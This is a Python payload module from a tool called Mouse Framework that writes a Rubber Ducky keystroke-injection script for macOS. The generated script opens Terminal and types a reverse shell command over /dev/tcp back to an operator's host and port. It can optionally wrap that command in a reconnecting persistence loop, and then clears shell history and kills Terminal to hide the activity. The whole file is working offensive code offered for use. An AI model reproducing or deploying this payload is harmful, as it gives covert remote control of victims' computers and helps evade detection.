#!/usr/bin/env python

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

from core import helper as h
import os, time

class payload:
	def __init__(self):
		self.name = "Rubber Duck payload"
		self.description = "Arduino payload that replicates keystrokes for shell script execution."
		self.usage = "Install via ducktoolkit.com site."

	def run(self,server):
		while 1:
			shell = raw_input(h.info_general_raw("Target Shell: ")).strip(" ")
			persistence = raw_input(h.info_question_raw("Make Persistent? (y/N): ")).strip(" ").lower()
			if persistence == "y":
				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
				shell_clean = "history -wc;killall Terminal"
				break
			elif persistence == "n" or not persistence:
				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
				shell_clean = "history -wc;killall Terminal"
				break
			else:
				h.info_error("Unrecognized option!")

		shell_command += "history -wc;killall Terminal"
		if os.path.exists("payloads") == False:
			os.mkdir("payloads")
		if os.path.exists("payloads/rubber_duck") == False:
			os.mkdir("payloads/rubber_duck")
		payload_save_path = "payloads/rubber_duck/payload.txt"
		payload = """\
DELAY 500
COMMAND SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 500
STRING """+shell_command+"""
DELAY 500
ENTER
DELAY 500
"""
		f = open(payload_save_path,"w")
		f.write(payload)
		f.close()
		h.info_general("Payload saved to " + payload_save_path)

